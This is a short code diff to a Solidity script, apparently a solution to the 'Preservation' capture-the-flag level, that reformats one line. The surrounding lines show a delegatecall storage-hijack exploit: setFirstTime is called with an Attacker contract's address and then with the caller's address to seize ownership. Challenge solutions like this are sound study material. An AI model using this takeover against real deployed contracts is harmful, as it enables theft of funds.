@@ -21,9 +21,7 @@ contract SolvePreservation is Script {
 
     function run() public {
         vm.startBroadcast();
-        preservation = Preservation(
-            payable(vm.envAddress("PRESERVATION_ADDRESS"))
-        );
+        preservation = Preservation(payable(vm.envAddress("PRESERVATION_ADDRESS")));
         preservation.setFirstTime(uint256(uint160(address(new Attacker()))));
         preservation.setFirstTime(uint256(uint160(msg.sender)));
         vm.stopBroadcast();
